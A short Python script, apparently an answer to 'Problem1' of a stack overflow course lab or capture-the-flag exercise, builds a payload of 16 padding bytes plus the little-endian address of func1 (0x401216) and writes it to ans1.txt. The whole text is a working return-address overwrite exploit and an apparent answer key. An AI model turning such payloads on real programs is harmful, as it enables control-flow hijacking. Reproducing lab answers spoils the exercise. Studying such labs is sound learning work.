padding = b"A" * 16  # 填充16字节到返回地址
func1_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"  # func1地址 0x401216 小端格式
payload = padding + func1_address

with open("ans1.txt", "wb") as f:
    f.write(payload)
print("Problem1 payload written to ans1.txt")